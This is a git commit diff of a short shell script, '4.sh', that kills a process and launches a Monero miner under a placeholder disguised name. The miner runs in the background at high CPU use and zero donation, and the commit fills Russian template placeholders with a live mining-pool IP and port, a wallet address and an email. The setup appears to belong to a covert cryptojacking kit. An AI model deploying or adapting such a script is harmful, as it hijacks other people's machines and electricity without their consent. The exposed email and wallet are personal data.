354e1727e7082c2e1235afb9a0aa7fd7111baab5
kasap777 <58770179+kasap777@users.noreply.github.com>
2019-12-18 16:52:46 -0500

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 51.89.208.21:3323 -u 47STpr2JiqaCMQ1pze7KQf1KDeRWMZVPedbKStTtJp17Y5ztWJhPw4hgLH5wChziAT2ZwamTNFeidSA7Eif22WF473XHxb1 --pass=x:kasap_1@bk.ru --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
